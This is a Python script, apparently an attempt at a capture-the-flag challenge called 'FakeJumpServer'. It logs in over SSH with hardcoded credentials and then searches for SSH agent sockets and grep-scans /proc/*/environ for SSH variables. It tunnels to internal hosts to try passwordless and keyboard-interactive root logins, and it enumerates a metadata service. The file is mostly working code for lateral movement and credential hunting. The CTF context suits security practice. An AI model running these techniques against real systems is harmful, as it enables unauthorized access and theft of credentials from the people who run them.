import paramiko
import socket
import time
import sys
import hashlib

"""
重新思考FakeJumpServer：

在真正的攻击场景中：
1. 用户A尝试通过跳板机连接到目标服务器
2. 跳板机伪装成目标服务器
3. 用户A输入密码
4. 跳板机捕获密码

问题是：捕获的密码去哪了？

可能的位置：
1. dropbear的日志
2. 某个特殊的通道
3. 环境变量
4. 某个内部服务

让我再次检查dropbear的行为。

另一个思路：
也许"FakeJumpServer"在这里的含义不同。
也许它是指dropbear伪装成localhost的服务器，
使得我们可以利用某种SSH特性。

SSH有一个特性叫做"Agent Forwarding"：
- 当用户开启agent forwarding时
- 跳板机可以使用用户的SSH密钥
- 这可能是攻击向量

但是我们需要有人开启agent forwarding才行...

让我检查是否有SSH agent socket可用
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def check_for_agent_sockets():
    """检查是否有agent sockets"""
    print("[*] 检查SSH Agent Sockets")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查环境变量和文件
    commands = [
        "echo $SSH_AUTH_SOCK",
        "ls -la /tmp/ssh-* 2>/dev/null",
        "ls -la /run/user/*/ssh-* 2>/dev/null",
        "find / -name 'ssh-*' -type s 2>/dev/null",
        "find / -name 'agent.*' 2>/dev/null",
        "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep SSH",
    ]
    
    for cmd in commands:
        try:
            stdin, stdout, stderr = ssh.exec_command(cmd, timeout=5)
            result = stdout.read().decode() + stderr.read().decode()
            if result.strip() and "Directory tree" not in result:
                print(f"\n{cmd}:")
                print(result[:500])
        except Exception as e:
            pass
    
    ssh.close()

def analyze_host_key_fingerprints():
    """分析主机密钥指纹"""
    print("\n[*] 分析主机密钥指纹")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 获取dropbear的主机密钥
    dropbear_key = transport.get_remote_server_key()
    print(f"Dropbear主机密钥: {dropbear_key.get_name()}")
    print(f"Dropbear指纹: {hashlib.md5(dropbear_key.asbytes()).hexdigest()}")
    
    # 现在通过隧道连接到localhost，看看是否返回相同的密钥
    targets = [
        ("localhost", 22),
        ("127.0.0.1", 22),
        ("172.17.0.1", 22),
    ]
    
    for host, port in targets:
        try:
            channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
            
            # 创建嵌套SSH
            nested_transport = paramiko.Transport(channel)
            nested_transport.start_client(timeout=10)
            
            nested_key = nested_transport.get_remote_server_key()
            fingerprint = hashlib.md5(nested_key.asbytes()).hexdigest()
            
            print(f"\n{host}:{port}:")
            print(f"  密钥类型: {nested_key.get_name()}")
            print(f"  指纹: {fingerprint}")
            
            # 比较是否与dropbear相同
            if fingerprint == hashlib.md5(dropbear_key.asbytes()).hexdigest():
                print(f"  [!] 与Dropbear主密钥相同！(FakeJumpServer)")
            else:
                print(f"  [!] 不同的服务器")
            
            nested_transport.close()
            channel.close()
            
        except Exception as e:
            print(f"{host}:{port}: 错误 - {e}")
    
    ssh.close()

def test_sftp_to_ubuntu():
    """尝试SFTP到Ubuntu主机"""
    print("\n[*] 尝试SFTP到172.17.0.1")
    
    jumphost = paramiko.SSHClient()
    jumphost.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jumphost.connect(HOST, PORT, USER, PASSWD)
    
    jumphost_transport = jumphost.get_transport()
    
    try:
        # 创建到172.17.0.1的隧道
        tunnel = jumphost_transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=10)
        
        # SSH连接
        target_transport = paramiko.Transport(tunnel)
        target_transport.start_client(timeout=10)
        
        # 尝试无密码认证（也许有配置问题允许）
        try:
            target_transport.auth_none("nobody")
        except paramiko.BadAuthenticationType as e:
            print(f"支持的认证方式: {e.allowed_types}")
        except Exception as e:
            print(f"认证错误: {e}")
        
        target_transport.close()
        tunnel.close()
        
    except Exception as e:
        print(f"错误: {e}")
    
    jumphost.close()

def try_keyboard_interactive():
    """尝试keyboard-interactive认证"""
    print("\n[*] 尝试keyboard-interactive认证")
    
    jumphost = paramiko.SSHClient()
    jumphost.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    jumphost.connect(HOST, PORT, USER, PASSWD)
    
    jumphost_transport = jumphost.get_transport()
    
    try:
        tunnel = jumphost_transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0), timeout=10)
        
        target_transport = paramiko.Transport(tunnel)
        target_transport.start_client(timeout=10)
        
        # 定义一个交互式处理器
        def handler(title, instructions, prompt_list):
            print(f"Title: {title}")
            print(f"Instructions: {instructions}")
            print(f"Prompts: {prompt_list}")
            return ["123456"]  # 返回我们的密码
        
        try:
            target_transport.auth_interactive("root", handler)
            print("Keyboard-interactive认证成功!")
        except Exception as e:
            print(f"认证失败: {e}")
        
        target_transport.close()
        tunnel.close()
        
    except Exception as e:
        print(f"错误: {e}")
    
    jumphost.close()

def http_get(transport, host, port, path):
    """发送HTTP GET请求"""
    try:
        channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
        channel.settimeout(5)
        
        request = f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n"
        channel.send(request.encode())
        
        time.sleep(0.5)
        response = b""
        while True:
            try:
                chunk = channel.recv(4096)
                if not chunk:
                    break
                response += chunk
            except:
                break
        
        channel.close()
        
        response_text = response.decode()
        if "\r\n\r\n" in response_text:
            body = response_text.split("\r\n\r\n", 1)[1]
            return body
        return response_text
    except Exception as e:
        return f"Error: {e}"

def explore_host_environment():
    """探索主机环境"""
    print("\n[*] 通过元数据探索主机环境")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 获取主机信息
    hosts = http_get(transport, "172.17.0.2", 80, "/latest/hosts/")
    print(f"主机列表:\n{hosts}")
    
    # 获取每个主机的详细信息
    if "Error" not in hosts:
        lines = hosts.strip().split("\n")
        
        for line in lines:
            parts = line.split("=")
            if len(parts) == 2:
                index = parts[0]
                name = parts[1]
                
                print(f"\n=== 主机: {name} ===")
                
                # 获取主机的所有属性
                host_info = http_get(transport, "172.17.0.2", 80, f"/latest/hosts/{index}/")
                if host_info and "Error" not in host_info:
                    attrs = host_info.strip().split("\n")
                    
                    for attr in attrs:
                        if not attr.endswith("/"):
                            value = http_get(transport, "172.17.0.2", 80, f"/latest/hosts/{index}/{attr}")
                            if value and "Error" not in value and "Not found" not in value:
                                print(f"  {attr}: {value.strip()}")
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入分析SSH认证机制")
    print("="*60)
    
    check_for_agent_sockets()
    
    print("\n" + "="*60)
    analyze_host_key_fingerprints()
    
    print("\n" + "="*60)
    test_sftp_to_ubuntu()
    
    print("\n" + "="*60)
    try_keyboard_interactive()
    
    print("\n" + "="*60)
    explore_host_environment()
